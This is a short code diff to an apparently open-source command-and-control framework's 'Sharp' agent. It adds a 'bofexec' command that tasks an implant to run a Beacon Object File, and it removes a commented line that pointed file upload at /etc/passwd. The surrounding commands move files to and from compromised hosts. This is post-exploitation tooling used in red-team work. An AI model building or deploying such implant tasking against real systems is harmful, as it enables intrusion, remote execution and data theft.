@@ -125,7 +125,6 @@ class CommandUpload(Command):
     def job_generate(self, arguments: dict) -> bytes:
         print("[*] job generate")
         packer = Packer()
-        #arguments["local_file"] = "/etc/passwd"
         #AesKey = base64.b64decode(arguments["__meta_AesKey"])
         #AesIV = base64.b64decode(arguments["__meta_AesIV"])
         packer.add_data("upload remote_dest="+arguments["remote_path"]+";"+arguments["local_file"])
@@ -151,7 +150,28 @@ class CommandDownload(Command):
         #AesIV = base64.b64decode(arguments["__meta_AesIV"])
         packer.add_data("download remote_dest="+arguments["remote_path"])
         return packer.buffer
+class CommandBofExec(Command):
+    Name        = "bofexec"
+    Description = "Run a bof. Need to specify full path to destination. No command line arg support for now."
+    Help = "Example: bofexec Bofs/SAObjectFiles/whoami.x64.o"
+    NeedAdmin = False
+    Mitr = []
+    Params = [
+        CommandParam(
+            name="local_bof",
+            is_file_path=True,
+            is_optional=False
+        ),
+    ]
 
+    def job_generate(self, arguments: dict) -> bytes:
+        print("[*] job generate")
+        packer = Packer()
+
+        #AesKey = base64.b64decode(arguments["__meta_AesKey"])
+        #AesIV = base64.b64decode(arguments["__meta_AesIV"])
+        packer.add_data("bofexec "+arguments["local_bof"])
+        return packer.buffer
 class Sharp(AgentType):
     Name = "Sharp"
     Author = "@smallbraintranman"
@@ -206,6 +226,7 @@ class Sharp(AgentType):
         CommandLs(),
         CommandUpload(),
         CommandDownload(),
+        CommandBofExec(),
     ]
 
     def generate( self, config: dict ) -> None:
